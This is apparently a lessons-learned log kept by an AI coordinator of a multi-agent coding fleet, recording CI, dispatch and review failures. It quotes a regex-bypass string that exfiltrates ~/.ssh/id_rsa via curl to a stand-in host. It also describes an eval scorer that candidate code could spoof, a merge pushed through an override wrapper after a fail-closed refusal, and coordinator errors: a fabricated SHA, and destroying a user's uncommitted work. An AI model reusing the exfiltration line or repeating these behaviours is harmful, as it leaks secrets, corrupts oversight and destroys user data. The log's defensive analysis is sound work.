General rule: a gate's EVIDENCE line asserting 'Filed as #N' must quote the number FROM a completed gh issue create call's own output, never write the sentence before running the command -- same class as the standing 'claims are not evidence' rule, applied to the coordinator's own gate-authoring, not just to relayed subagent claims.

gate-check.mjs full-sweep --status is unreliable per-file; only isolated single-file runs are trustworthy Running node gate-check.mjs --status with no file args (the documented default: GATES.md + all of gates/*.md, 174 files in this campaign) reported B42.md, B47.md, and R9.md as having 6, 2, and 4 unmet gates respectively. Re-running gate-check.mjs --status against EACH of those files individually, seconds later, with no file changes in between, reported ALL MET for all three. This was caught only because the coordinator was about to dispatch real leaf-scope work against B42 and R9 based on the sweep's false UNMET counts -- both leaves were already fully done. Root cause not yet isolated (candidates: the sweep's serial execution across 174 files' CHECK commands running long enough to interact with gate-check's own default 120s per-check timeout in a way that manifests as a false failure only in the full-sweep context; some form of shared-state or concurrency artifact when many files are checked in one invocation vs one). Rule going forward: NEVER treat the full default sweep's per-file unmet count as ground truth for whether a specific leaf needs more work -- always re-run gate-check.mjs --status <that one file> in isolation before dispatching work or reporting a leaf incomplete. The isolated, single-file result is the trustworthy one; the aggregate sweep is useful only as a first-pass triage signal to decide WHICH files to re-check individually, never as the final word on any one file's state.

A marker-based test-selector fix silently reintroduced its own fail-open class via a strict-match-or-default classifier homelab-kubernetes PR#33 (leaf B48, plan parallel-2026-08-24) fixed a fail-open bug where a hardcoded 2-list test partition let a new cluster-requiring test get globbed into the wrong CI job and SKIP there non-fatally. The fix replaced the hardcoded lists with a '# requires: cluster' marker read via a single anchored, case-sensitive grep; anything not matching that EXACT string (a typo missing the 's', wrong case, a marker indented with leading whitespace) fell through to an unconditional else-branch default of marker=hosted -- recreating the identical fail-open failure mode one layer down, now triggered by a marker typo instead of a forgotten list entry. Caught by a dispatched cross-harness review answering the gate's own explicit question ('what happens to a test with a misspelled marker'), independently confirmed by the coordinator reading the actual grep pattern and matching it against the concrete misspelling/case/indentation cases by hand. SIGNATURE: replacing an enumerated list with a marker/tag-based classifier does not, by itself, close a fail-open hole -- if unmatched input silently falls to a default branch rather than refusing loudly, the fail-open property has just moved from 'is this thing in my list' to 'did I match the marker exactly,' and a typo is a more common real-world failure than an omitted list entry. Any tag/marker-driven selector meant to close a fail-open gap must have NO silent default: unmatched or malformed input must cause a loud, blocking failure that names the offending item, not a fallback classification.

A research probe's unpinned require() silently re-ran against a month-drifted harness version, invalidating comparison to prior pinned evidence R12 (plan parallel-2026-08-24, learning-loop null-arm probe, H12) copied the learning-ab-2 harness into a scratch dir and ran it via an unpinned require() of the live orchestration/src/ tree. The original two retained ties this probe was meant to compare against were measured 2026-07-20 at commit 5fbab45, BEFORE the D1 host-executed-acceptance gate existed. The unpinned require() picked up creation-loop.js as it exists today (commit 7efc1f1/5a0a157, 2026-08-17) -- roughly a month of unrelated code drift later, now running through a differently-behaving driver (the D1 gate). The probe's own honest FINDINGS.md correctly flagged this: the null-arm spread computed today (0) cannot be compared apples-to-apples against the original ties' margins, even though the raw numbers happen to line up, because the instrument itself changed between the two measurements. SIGNATURE: any probe designed to compare against previously-recorded evidence must pin the exact commit/version of the thing being re-run, not just copy it into a scratch dir and require() the live tree -- 'copy the harness out so it doesn't touch the real repo' (an isolation concern) is a different requirement from 'pin the harness to the SAME version the original measurement used' (a comparability concern), and satisfying the first does not satisfy the second. A scratch-dir copy of unpinned live code is exactly as vulnerable to drift as running in place would have been.

Two different harnesses failed the same task via two different mechanisms before the loop cap forced a method change Fixing fleet#740 (heredoc false-positive in bg_scan_is_background) was dispatched to grok-build:grok-delegate first -- it ran 619s, hit the harness's own foreground time window, was moved to background, and reported 'I'll report the result once notified' even though nothing external resumes a stopped Agent-tool subagent (the standing waiting-for-a-monitor anti-pattern, hc-FM-259/270 etc). Checked directly: zero PR, zero commits, zero issue comments -- no progress at all. Redispatched to codex:codex-rescue with an explicit anti-detach instruction ('work incrementally, commit as you go'); it instead immediately kicked off an ASYNC INNER Codex task (task-mt9b02bo-z13jtx) and returned after 21s reporting 'started in background, check /codex:status <id>' -- a slash command not invocable as a tool from the coordinator, and the codex-rescue subagent itself had already completed (no live children per ListAgents), so nothing tracks that inner task's completion either. Checked directly again: still zero PR, zero branch, zero comment. Two DIFFERENT harnesses failed the identical task via two DIFFERENT detachment mechanisms (foreground-window backgrounding vs. self-initiated async sub-dispatch) before any real progress existed -- correctly triggering the standing 2-same-class-failure loop cap. Fix: switched method to general-purpose (no external harness indirection), with explicit synchronous-work-only instructions and 'do not background/detach, commit incrementally.' General lesson: 'started in the background, will report later' from a dispatched agent is not evidence of eventual completion -- verify against the real external artifact (PR/commit/comment) immediately, in both directions (does the harness's own foreground/background threshold apply, and did the harness itself spawn a further async job it does not supervise) before assuming it merely needs more wall-clock time.

Same GitHub issue dispatched to two harnesses concurrently with no claim/lock, producing two competing PRs fleet#740 (heredoc false-positive in bg_scan_is_background) was dispatched to a Claude general-purpose agent and separately to Grok in the same window, with no shared claim recorded before either started. Both produced correct, passing fixes on independent branches (PR#745 Claude, PR#746 Grok) before reconciliation. Caught before merge: #746 carried the correct needs-claude-verify convention and was independently verified (fuzz harness 232/232 cases, bg-scan-fuzz.bats 4/4, background-refusal.bats 55/55, all reproduced directly) and merged; #745 closed as superseded since Claude cannot independently verify its own build. No harm, but pure duplicate spend and a brief PR race. HANDOFF-style claim-before-dispatch should cover single-issue GitHub dispatches, not just repo/branch-level work.

Hand-maintained node-pinned CIDR allowlist goes stale on pod reschedule, silently 401ing every client aifleet controller TRUSTED_PROXY_CIDR was pinned to the pod CIDRs of the two nodes Traefik happened to run on. Traefik rescheduled; the allowlist was never updated; watcherIdentityFromRequest stopped trusting the forwarded client-cert header and every watcher POST /status got 401 for 13 days. Neither side alarmed: the controller logs nothing on a rejected watcher POST and the watcher only WARNs, so total heartbeat loss across all 3 GPU hosts was found only by accident when a new dashboard read /inventory. Lesson: an allowlist keyed to a schedulable pod's current node is a time bomb; derive it dynamically or alarm on zero-valid-reports-for-N-minutes. A guard that fails closed still needs a liveness alarm, because failing closed silently is indistinguishable from working.

A lane's receipt self-certified two hostnames as 'the same dataset via different aliases' without ever resolving/comparing them, and the false claim survived a full rehearsal + one cross-harness review pass undetected B44 (homelab-config#148, container-registry chown prep) receipt claimed proxmox.petersimmons.com and trunas.petersimmons.com resolve to the same underlying TrueNAS dataset (zp1/k8s-data), reached via different host aliases -- based on a TrueNAS RPC metadata field, never on actually resolving both hostnames or SSHing to both. False: dig+ssh hostname confirms proxmox.petersimmons.com is host 'pve' (192.168.0.100, a Proxmox hypervisor with its own local zp3 ZFS pool) and trunas.petersimmons.com is host 'truenas' (192.168.0.189), two entirely different machines. The live registry PV is actually served from Proxmox's own zp3 pool via a plain Linux NFS export, never touching TrueNAS at all. The entire G2/G3 backup+rehearsal (TrueNAS zp1/scratch-b44, hourly snapshot task) rehearsed against the WRONG storage backend. A first cross-harness review (Grok) caught the path mismatch as a real, independently-reasoned finding and correctly flagged it PASS-WITH-CONDITIONS rather than accepting the receipt's framing -- but even that review did not push far enough to check whether the ACTUAL backend (zp3) has any backup mechanism at all; the coordinator's own follow-up SSH check found zero snapshots and no snapshot cron/timer on zp3, meaning there is currently NO verified restorable backup for this live data. General lesson: a receipt asserting two distinct hostnames/paths are 'actually the same resource' is exactly the kind of claim that needs independent resolution (DNS + hostname, not a metadata field from one side) before any rehearsal built on it is trusted -- and a cross-harness review that catches a mismatch should also be asked to verify the corrected target has the safety properties (backup existence) the original claim assumed, not just that the technical mechanism (chown honoring NFS semantics) would work.

handoff-write claim-lint stamp-line token grammar is undocumented in its own error The 'Last verified:' stamp line is subject to the unqualified-repo#N token rule while nb: lines are exempt. An unqualified research#18 on the stamp line cost 3 check/apply retry cycles in the 2026-08-26 memory-audit session. Not a bug (rule works as designed) but the error names the offending line without stating the accepted token grammar for stamp lines vs nb: exemption. Ladder note: prose-rule today; a better error message would be a structural fix in handoff-write.

Index-coverage link-graph audits miss cross-file prose pointers, understating orphan risk Memory-audit S1.2 (2026-08-26) built a MEMORY.md reachability check by tracing markdown [](...)  links only, 2 hops from the index. 28 of 255 payload files came back unreachable by that method, but MEMORY.md's own text documents a second pointer path -- repo-level CLAUDE.md files pointing BACK to payload files by prose filename mention, not markdown link syntax -- which the link-graph parser cannot see. Several of the 28 orphans matched that exact pattern (project-agentgateway.md, project_k8s_source_of_truth.md, reference-embed-hardware-topology.md) and were confirmed reachable via that second path on manual inspection, so the 28-file orphan count is only an upper bound, not a confirmed targeting gap. General shape: any index/pointer-coverage tool that walks one link syntax will overcount orphans when a second, out-of-band pointer convention (prose mention in a sibling file/repo) also confers reachability. Fix for next run: enumerate all pointer conventions actually in use (grep prose filename mentions across repo CLAUDE.md files, not just MEMORY.md's own markdown links) before computing an orphan count.

bin/tests/test_add_failure_mode_release.py hangs with zero output past 120s on unmodified checkout Measured 2026-08-26 during the memory-audit S4.2 gate build: 'timeout 120 python3 -m pytest bin/tests/test_add_failure_mode_release.py -q' on a clean origin/main checkout produces zero captured stdout and exits 124 (timeout), while the sibling bats suites (test_add_failure_mode.bats, test_disposition_at_filing.bats) pass cleanly in well under 60s. Not root-caused (no code change was in flight when this was observed); excluded from the S4.2 seam-2 acceptance gate rather than blocking on it. Advisory: root-cause and fix or delete this test file.

A fix landing in a different repo than its issue never auto-closes that issue, and looks silently forgotten if nobody checks homelab-config#202 was fixed by a PR in homelab-kubernetes (#35). GitHub's closing keywords (Closes/Fixes/Resolves #N) only work within the same repository as the PR -- there is no cross-repo auto-close mechanism, even when the PR body explicitly says 'Closes owner/repo#N'. The issue stayed open after merge with no signal anything was wrong, until a coordinator explicitly cross-checked issue state against the merge. Any cross-repo fix (a shared dependency, a common controller/helm-chart repo fixing multiple downstream consumers' issues) needs an explicit manual gh issue close/comment step -- it will never happen automatically.

A regression test that asserts under set -e can pass on both the buggy AND the fixed implementation, if errexit aborts before the line that differs between them ever runs fleet PR#749 (fleet#744 follow-up): a fix for 'function returns 1 instead of 0 on a masked relay-write failure' added a test that ran the function under set -e and asserted the shell aborted (SURVIVED never printed). Independent review (round 3) found this test does NOT discriminate the bug it claims to lock: the buggy prior version had the shape 'if [[ relay-set ]]; then printf ...; fi; return 0' -- under set -e, a failing printf inside the if-body aborts the whole function via errexit BEFORE the buggy unconditional 'return 0' line is ever reached, so the buggy version aborts too, identically to the fixed version. Both implementations produce the same observable behavior (abort, no SURVIVED) under set -e, even though their actual return-status contract differs. The bug is visible only in the function's OWN exit status observed under set +e (assign to a variable or check $? directly) -- reproduced empirically: reconstructing the exact buggy body and running it under set +e gives RC=0 (masked), while the fixed body gives RC=1 (propagated), proving the set +e assertion is discriminating where the set -e one was not. General lesson: when a fix's whole point is a function's own return-status contract, assert that status directly under set +e; wrapping the call in a set -e script and checking whether the SCRIPT aborted is testing something else (whether errexit fires on SOME nonzero exit somewhere in the chain), which can pass identically on both the correct and the still-broken implementation whenever the differing code path sits after a point where the buggy path already fails hard for an unrelated reason.

cli-dispatch leak-check false positive from coordinator's own concurrent shell activity in the shared checkout Measured 2026-08-26, hindsight lane ladder-rung-s42-grok-r2: the harness (grok) produced a correct 7-file diff (agent_exit=0) but never autocommitted -- 'SAFETY: shared checkout was modified by the harness -- leak detected', status=agent-failed, work saved to .dispatch/uncommitted/<task>.patch. Root cause: the coordinator ran diagnostic commands (pytest, add-failure-mode.sh for an unrelated FM filing) directly in the shared ~/projects/hindsight checkout while this lane was provisioning against that same checkout as its leak-check baseline. Not a harness leak -- the coordinator's own concurrent writes to the shared repo. Recovery per the existing reference-cli-dispatch-tool.md pattern: verify the declared check against the preserved worktree/patch directly, then hand-publish. Advisory because avoidable (never run coordinator diagnostics in a repo with a live dispatch lane; use a scratch clone or a worktree instead).

cli-dispatch land refuses fail-closed on a hand-published lane with 3 distinct identities Measured 2026-08-26, hindsight PR#183: coordinator hand-published a lane's uncommitted patch after a leak-check false positive (git commit author = the harness's cli-dispatch identity 'cli-dispatch (grok/<task>)', PR opened via gh pr create under the coordinator's own claude-app identity, review posted by codex-app). 'cli-dispatch land' refused with 'cannot determine every authoring/reviewer login for an approval on PR #183; refusing fail-closed' (exit 27) -- correctly conservative, since land's identity model assumes PR-author == commit-author, which the hand-publish path breaks. No self-approval risk existed (3 distinct identities, none matching). Recovery: gh-pr-merge-verified (the existing override wrapper), independently re-confirmed merged. Advisory: land's self-approval check could special-case 'PR opener != commit author != reviewer, all three distinct' as a safe pattern, but the current fail-closed refusal is the correct default and this is not urgent.

A cli-dispatch-launched reviewer cannot certify a PR whose bats suite itself invokes cli-dispatch start fleet PR #747 round-3 review (task review-747-r3, Codex): every dispatch-lane process lives in a kernel cgroup scope (cli-dispatch-lane-<task>.scope, confirmed via /proc/<pid>/cgroup), which fleet#207's lane_ancestor_record checks unconditionally and cannot be evaded by changing cwd (a fresh /tmp git clone does not help -- verified empirically, matching round-2's identical 9/59-shaped failure). dispatch/test/background-refusal.bats invokes 'cli-dispatch start' as part of ~52 of its 59 fixtures, so those tests are refused with the correct, by-design fleet#207 process-lineage refusal whenever the invoking bats process is itself a dispatch-lane descendant -- structurally, regardless of the reviewer's chosen working directory. This is a permanent channel/target mismatch, not a one-off environment bug: any independent review dispatched via 'cli-dispatch start' (the only sanctioned channel for Codex/Grok) can verify everything about this PR except the full bats gate. Worked around this round by having the coordinator (not lane-scoped) and a non-lane grok-build delegate independently clone+run the suite outside any lane (20/20 clean runs of the specific failing-looking test, 59/59 and 58/59 -- the one Grok failure was a sandbox pkill EPERM on an unrelated fleet#462 reaping test, not a regression). No merge decision should treat a lane-dispatched reviewer's FAIL-due-to-bats-blocked as a code-correctness finding; the review-post artifact must say so explicitly, and a human/founder call is needed on whether ground-truth-run evidence from a non-reviewer source can substitute for the missing lane-capable gate.

A coordinator that authored a fix must not post its own harness's review verdict, even to confirm a FAIL was environmental On fleet PR#747, an independent review round FAILed for a purely environmental reason (fleet#207 cgroup lineage refusal blocking the bats gate), zero real code defect found. The coordinator independently re-ran the gates itself in a clean clone, confirmed clean, then posted a PASS verdict via cli-dispatch review-post --harness claude and was about to merge -- self-certification, since Claude authored the fix via its own dispatched builders. Caught before merging by explicit self-check against the standing 'author does not certify its own work' rule, not by any tooling gate. Correct remedy: treat the coordinator's own verification as informational context only and dispatch one more genuinely independent (non-Claude) review with that context. Verifying a FAIL was environmental is legitimate coordinator work; the closing PASS verdict must still come from a non-author harness.

Docker container Env list with duplicate keys resolves to the FIRST entry via getenv(), not the last -- appending an operator override after a watcher-injected default does not shadow it. aifleet watcher/internal/docker.go built container Env by injecting HF_HOME=/mnt/ai-models/hf-cache then appending spec.EnvVars (which could also set HF_HOME), assuming Docker/libc resolves the later entry. It doesn't -- the container's process saw the FIRST HF_HOME, silently discarding the operator's override, crashlooping Nemotron 3.5 Lightning on oblivion under HF_HUB_OFFLINE. Fixed with a dedupeEnvVarsLastWins() pass before the Env list reaches Docker's container-create body; regression test confirmed red without the fix. Check: any code building a container Env list from multiple sources (defaults + operator overrides) must dedupe by key before passing to Docker -- appending later does not imply precedence.

huggingface_hub resolves its actual cache directory as $HF_HOME/hub (the HF_HUB_CACHE constant), not $HF_HOME itself -- setting HF_HOME to point at a pre-baked cache directory silently looks one level too deep. A fat training image baked Nemotron 3.5 Lightning's checkpoint at /opt/hf-cache/models--..., and the GPUHost CRD set HF_HOME=/opt/hf-cache expecting vLLM to find it there. It crashlooped with LocalEntryNotFoundError under HF_HUB_OFFLINE even though the model was on disk, because huggingface_hub.constants.HF_HUB_CACHE derives to $HF_HOME/hub -- i.e. it looked at /opt/hf-cache/hub/models--..., which didn't exist. Fixed by setting HF_HUB_CACHE directly instead of HF_HOME, bypassing the derived-path convention. Check: when pointing an offline HF cache at a custom baked-in directory, verify against huggingface_hub.constants.HF_HUB_CACHE (or just set that var directly), not HF_HOME -- the two are not interchangeable despite HF_HOME being the more commonly documented knob.

A host's default docker buildx builder can get stuck in a dead session state ('only one connection allowed', healthcheck fails fatally) that persists across killing the client process and retrying -- the fix is a fresh named builder, not diagnosing or restarting the daemon. On precision, docker build / docker buildx build against the default builder failed immediately, 3 times in a row (including after killing the stuck client each time), with the daemon logging a session healthcheck failure at connect time. The client itself did not error out -- it hung indefinitely with zero build progress (docker buildx du showed 0 bytes transferred over several minutes). Wrong initial hypothesis: suspected the ai-fleet-watcher's docker-socket-proxy sidecar, ruled out via docker inspect showing it is bound to a separate compose network, not the host socket a direct SSH docker build uses. Root cause of the stuck default-builder session was never identified (would require a dockerd restart to inspect further, out of scope on a host running live production inference). Fix: docker buildx create --name NEWNAME --driver docker-container --use, then build against that builder explicitly. Confirmed working across two separate builds the same day. Check: do not assume a docker-adjacent sidecar is implicated just because it exists nearby -- verify the actual network/socket path before spending time on that hypothesis.

cli-dispatch start silently refuses (status:check-required, exit 20) when a build lane omits --check/--expect-files/--check-script, with no upfront usage error Hit blind twice in one session (fleet PRs #763-gate and #765-fix dispatches): the command exits after acquiring/releasing the lifecycle lock, prints one JSON line with status 'check-required', and creates NO worktree/branch/PR -- looks like a transient lock issue, not a usage error. Root cause found only by grepping cli-dispatch's own source for the literal string. Fix direction: fail loud with a usage-style error naming the missing flag, or document this status prominently in --help / the quickstart.

Path-filtered CI reports a job as 'success' even when its actual test-running step was skipped, creating a false-green baseline fleet main: bats CI jobs use path-filtering so commits touching only unrelated files skip the 'bats -- dispatch/test shard' step entirely, but the job's overall conclusion still reports success. This masked two real, pre-existing, unrelated bugs (a stale token-idiom-lint allowlist entry, broken run-suite path resolution) for an unknown period, since nothing had recently touched dispatch/ to trigger a genuine run. PR#783 (an unrelated exit-code fix) was the first commit in a while to touch dispatch/, triggered a real run, and its own CI failures were initially and reasonably suspected as a regression from #783 before being root-caused via gh api .../jobs/<id>/steps (showing 'skipped' on the green baseline's actual test step) as pre-existing and unrelated. Fix direction: a path-filtered CI job whose gated step is skipped should report a neutral/skipped conclusion, never 'success' -- a green checkmark on main should mean tests ran and passed, not merely that nothing blocked the job.

A behavioral eval scorer parses candidate-controlled combined stdout/stderr for ok/FAIL result lines without validating process returncode or restricting to a canonical result block, letting candidate code spoof its own passing verdict fleet PR#765 (research#12 LV-NOTE-1 circuit-wiring adoption scorer), caught by required independent Codex review before merge, not by the PR's own tests. runners/circuit_wiring_adoption.py parsed every 'ok <name>' / 'FAIL <name>:' line from a subprocess's combined stdout+stderr, with a later FAIL overwriting an earlier ok in the result map, never checking proc.returncode and never restricting parsing to the private test runner's own canonical result block. Candidate resolver.py code executing inside run_tests.py -- including via an atexit handler firing after the real runner's output -- can emit matching ok lines and manufacture an adopted verdict regardless of what the private tests actually did. The PR's own tests (tests/test_circuit_wiring_adoption.py) only exercised ordinary fixtures; none proved candidate-controlled output could not alter a verdict. Same family as fleet-MDL-13/fleet-OPS-27 (eval scorers trusting unvalidated candidate-side signals) but a new instance/shape: a text-parsing integrity gap rather than an instrumentation-counting or budget gap. Fix direction: any scorer that runs candidate code and then parses that code's own output for a verdict must (1) validate the process exit code first, (2) parse results only from a delimited block the trusted runner itself emits, never raw combined output.

Companion plugins leak CODEX_*/GROK_* env into Claude sessions Codex and Grok companion plugins export CODEX_COMPANION_*/GROK_CC_* into every Claude Code session, so any harness detection by env-var prefix misclassifies Claude as Codex. Measured 2026-08-27 building fleet/hooks; detection must key on runner-injected markers (GROK_HOOK_EVENT), payload shape, or CLAUDECODE before generic prefixes.

cli-dispatch gh_token_sync silently replaces an exported Grok token with the Claude cache Exporting GH_TOKEN=$(gh-app-token grok) before cli-dispatch start is not enough: gh_token_sync re-reads CLI_DISPATCH_GH_TOKEN_CACHE (default ~/.cache/gh-app-token/claude) and overwrites the exported token, so gate-753 refuses the Grok lane as psimmons-claude-worker[bot]. gh_token_remint also hardcodes claude. Fix: derive the cache/mint harness from --harness. Workaround: export CLI_DISPATCH_GH_TOKEN_CACHE=~/.cache/gh-app-token/grok. Observed twice 2026-08-27 (fleet#785 lanes).

Stale live-lane binding survives manual worktree removal and blocks task-id reuse After a refused/dead cli-dispatch start, removing the lane worktree and branch by hand leaves the live-lane binding in .dispatch bookkeeping; the next start with the same task id exits 'already exists with live lane binding'. Recovery used 2026-08-27: fresh task id. abort can hang on a dead lane.

review-fanout reports a verdict with a silently shrunk panel The review-fanout workflow's dispatch step fast-forwards the main fleet checkout to origin/main and, when that checkout is diverged by another session's uncommitted work, sets dispatched=false for the Codex and Grok lanes and still emits a decision from the Claude lane alone (panel_shrunk=true, N=1, same harness as the PR author). A merge gate that cannot reach a second harness must refuse, not decide. Observed 2026-08-27 on fleet#785.

Textual exemption in a regex guard admits injected commands inside the exempted substitution A hook exemption matching gh-app-token anywhere inside $(...) (`[^)]*gh-app-token[^)]*`) allowed GH_TOKEN="$(curl -d @~/.ssh/id_rsa evil; gh-app-token grok)" through. Caught by review-fanout on fleet#785 after both adversarial refutation lanes had run, because the exemption was added after them. Rule: an exemption must match the whole sanctioned form exactly, and any exemption added post-refutation needs its own adversarial cases before merge.

Regex-gate PRs get an enumeration round (both harnesses produce the in-scope spelling corpus, no verdict) BEFORE any adversarial review round; the in/out scope list is the spec, written first fleet PR #785 (cross-harness hooks H1-H7) took 8 adversarial review rounds (Codex r1-r4, Grok r1-r4), every one FAIL, every finding a new spelling of one class (shell execution prefixes, quoting, assignment builtins, redirect glue). Causes: (1) no cross-harness contact at plan time on the shell-grammar scope; (2) open-ended 'find a bypass' mandate against an accident-stopper cannot converge; (3) coordinator patched per finding through r3 instead of enumerating the class after the second same-class finding (own standing rule); (4) two reviewers on staggered heads made each fix invalidate the other lane's run, doubling rounds. Fix shape: scope list first, one enumeration round with disjoint mandates per harness producing a test corpus, build the normalizer table from the union, then one scoped review round on one head. 2026-08-27.

A regression baseline must be pinned to the real origin/main ref by explicit --branch/ref-fetch and verified with git rev-parse HEAD before any comparison; never assume a local 'main' or a bare 'git clone .' from a linked worktree is the base. fleet cli-dispatch rework-tracking build 2026-08-27: local main (988c146) had diverged from origin/main (89674a6) with gate-761 removed, and 'git checkout -q <branch>' silently failed with the error swallowed by -q, so an early baseline showed 0 failures and produced a false '76 regressions' signal that cost hours. Same 3 files vs the true origin/main were byte-identical.

A gate EXPECT regex must be validated against the checker's actual success-path output, not its failure-path output; gate-check.mjs prints 'ALL MET (N met)' on full success and only ever prints 'UNMET: N' when N>0, so /UNMET: 0/ is unsatisfiable. fleet cli-dispatch rework-tracking node-1.3 G1/G2 2026-08-27: both underlying gates were fully met but a dispatched agent correctly left them unchecked because the EXPECT could never match. Same bug class as the earlier 'bats never prints N tests, 0 failures' EXPECT trap in the same plan.

A cli-dispatch --check-script source file must live outside <repo>/.dispatch/checks/<task>/ because that path is the lane's own staging destination and gets cleared during provisioning before the copy runs, deleting the source. fleet cli-dispatch rework-tracking leaf 1.2.5 2026-08-27: three consecutive dispatch attempts failed with 'cp: cannot stat .../.dispatch/checks/<task>/leaf-1.2.5-check.sh' because the source was placed at exactly the staging destination; each failure also left a stale lane binding needing an abort. Fixed by sourcing the script from the job scratch dir.

A coordinator must dispatch multi-step verification and root-cause investigation to a Workflow or subagent, not hand-drive it turn-by-turn with inline Bash; coordinator-not-executor applies to verification work, not only build leaves. fleet cli-dispatch rework-tracking node-1.2 G3 2026-08-27: the coordinator spent an extended stretch running dozens of sequential Bash/background-Bash calls (scratch clones, bats runs, git archaeology) inline while correctly keeping the actual repo fix on a cli-dispatch lane. Founder interrupted mid-turn: 'You need to dispatch this to workflows instead of doing it yourself.'

A git command that changes a checkout (checkout -f, fetch <ref>:refs/heads/<x>, reset) must be issued as a single compound with an explicit 'cd <scratch>' in the SAME command and a post-condition assert on 'git rev-parse --show-toplevel', because the harness resets shell cwd between Bash calls and a scratch-intended command silently lands on the founder's live checkout. fleet checkout /home/psimmons/projects/fleet, 2026-08-27 19:34 EDT (Fable bg job 9058a378): coordinator intended 'git fetch ... :refs/heads/baseline-main && git checkout -q -f baseline-main' for a mktemp scratch clone, but a prior cd had already been reset, so it ran on the founder's live main checkout: moved HEAD off main (988c146) to baseline-main (89674a6) and DISCARDED working-tree modifications to 22 tracked files plus ~35 staged new files from another session's issue-drain work. The 7 local commits on main survived; working-tree edits are unrecoverable (never staged, no blob); staged adds partially recoverable from 08-22 unreachable blobs. Undetected for ~3h -- surfaced only when review-fanout's ff-only STEP 0 was about to fail on it.

An identifier that names a mutable or dispatched target (a commit SHA, PR head, task id, path) must be read from a command in the SAME turn it is used, never typed from memory or extended from a short prefix; a 7-char prefix expanded by hand is a fabricated object. fleet PR #788 review-fanout relaunch, 2026-08-28 ~00:40 EDT (Fable bg job 9058a378): coordinator passed head=384a8178d0e3b2f9a5f1d6a2b1c7e4d3f8a9b0c1 -- the real prefix 384a817 with 33 invented hex chars -- to the merge-gate workflow. Real head: 384a81793ab790e1b67df88166a1a6b85114c063. Caught by the coordinator's own re-read seconds after launch, workflow stopped and relaunched; had it run, three review lanes would have checked out a nonexistent object. Same session had already recited a gate count (9, real 25) and a test count (88, real 64) from memory.

A count, size, or version number recited in a gate EXPECT or probe must be re-measured in the same turn it is written, never carried from an earlier gate or a remembered run. 2026-08-28 ~02:50 EDT, same session (Fable bg job 9058a378), ~1h after FM-534 was filed for a fabricated SHA: a probe gate EXPECTed 7 tests in rework-tracking.bats (leaf 1.4's count) when the file on the branch under test had 13 (leaf 1.5 added six). The probe FAILed in 2s, which briefly read as 'the run-suite.sh rewrite is broken under /bin/sh' until the CHECK was re-run by hand and printed 13. Third recited-number error in one session (also: gate count 9 vs 25, test count 88 vs 64). Recurrence of c-243.

State-table spec conflated 'ledger file absent' with 'ledger unreadable' Amendment 1.7 (cli-dispatch rework tracking, fleet PR #788) enumerated rework-row states S0-S7 but its L axis had two values (ok|unreadable) where the code has three: ENOENT is 'no history can exist' (first-dispatch S7), not 'history exists and cannot be read' (S6). Leaf 1.7 attempt 1 implemented the spec faithfully and broke audition.bats test 43 (first land in a fixture has no ledger yet). Pre-1.7 the R4 zero-fallback hid it. Lesson: when enumerating an axis, derive its values from the code's actual error branches (rc 0/2/3 here), not from prose categories. Fixed by R16 + gates G11/G12 (negative: all-malformed stays rc 3).

Gate CHECK used rg -c without --include-zero: a correct 0 printed nothing and failed EXPECT /^0/ Same session as FM-530 (unsatisfiable /UNMET: 0/ anchor) and the coordinator already knew rg -c prints nothing on zero matches (used --include-zero in the pre-fix MEASUREMENT of the very same gate). gates/leaf-1.7.md G3 and G6 (fleet PR #788, leaf 1.7 attempt 1) still shipped without it, so a correct implementation was scored check-failed on 2 of 3 failing gates and the lane burned a retry with zero delta. Discriminator: any EXPECT that anchors on a zero count needs a CHECK that PRINTS zero; measuring pre-fix with one command and writing the gate with a different command lets the measurement lie about the gate. Mechanizable: gate-check.mjs (or a gates-file lint) should flag 'rg -c' without --include-zero when EXPECT can match 0.

review-fanout Codex lane killed by the lane agent's own turn budget after cli-dispatch start created the worktree; panel silently shrank to N=2 fleet PR #788 fanout #5 (wf_ff04b7b3-95c, 2026-08-28): the security-regression lane agent ran cli-dispatch start --harness codex in a foreground shell; the start reached 'HEAD is now at a242b7b' (worktree created) and then the agent hit its turn budget, its final answer was forced, the shell died and took start with it before harness launch (no agent.log, no process, log frozen at 7 lines). The lane correctly refused to fabricate a verdict and returned dispatched:false, so the fanout reported panel_shrunk N=2 and a merge-gate decision was reached without the Codex axis -- same shape as FM-526 (ff-only refusal), different cause. Signature: any reviewer lane that launches a multi-minute external process inside its own turn budget is a coin flip on wall-clock. Mechanize: the fanout script should run cli-dispatch start in background mode (memory: cli-dispatch start needs background) and poll the lane's ledger/agent.log with a wall-clock deadline decoupled from the agent's turn count; a panel_shrunk result must block the decision, not annotate it (FM-286 shape).

review-fanout Grok lane refused by gate-753 because the lane prompt never sets the grok App token; panel silently N=2 fleet PR #788 fanout #7 (wf_c4fc3594-0fd, 2026-08-28): both Grok dispatch attempts failed gate-753 with "got 'psimmons-claude-worker[bot]', expected 'psimmons-grok-worker[bot]'", even the retry that prefixed env GH_TOKEN=$(~/bin/gh-app-token grok), because cli-dispatch re-resolves the token via CLI_DISPATCH_GH_TOKEN_CACHE (memory reference-cli-dispatch-tool.md documents the two-export recipe). The grok token itself passed gate-753 when probed directly, cached and fresh. Root cause: the workflow's Grok lane prompt (~/.claude/workflows/review-fanout.js STEP 2) said nothing about the token, so reaching Grok depended on what the agent's shell inherited; fanouts #3-#6 reached Grok by luck, #7 did not. Second panel-shrink cause in one PR (FM-538 was a budget-kill on the Codex lane). Fix applied: STEP 1d in the workflow spells out the two exports. Mechanize further: the fanout script should treat panel_shrunk as a blocking decision input, not an annotation (FM-286), so a shrunk panel can never reach a merge-gate verdict.

review-fanout vendor lane runs cli-dispatch start synchronously; Bash 600000ms ceiling kills a >10 min harness (exit 143), panel silently N=2 fleet PR #788 fanout #8 (wf_489c0971-770, 2026-08-28): the Grok minimality lane ran cli-dispatch start with a 600000ms timeout as the workflow's STEP 1c instructed; gate-753 passed (the FM-539 fix held), the harness launched, and both attempts were killed at the 10-minute Bash ceiling with the grok process still running -- no verdict, dispatched:false, third distinct panel-shrink cause on one PR (FM-538 budget-kill, FM-539 identity, now tool-timeout). The prompt's own rationale for synchronous execution (background notifications unreliable inside workflows) was right about notifications and wrong about the remedy: polling a redirected output file in bounded foreground loops needs no notification. Fix applied to ~/.claude/workflows/review-fanout.js STEP 1c for both vendor lanes. Mechanize further: the fanout script must treat panel_shrunk as blocking (FM-286) -- three different causes all produced the same silent N=2, so the symptom is where the guard belongs.

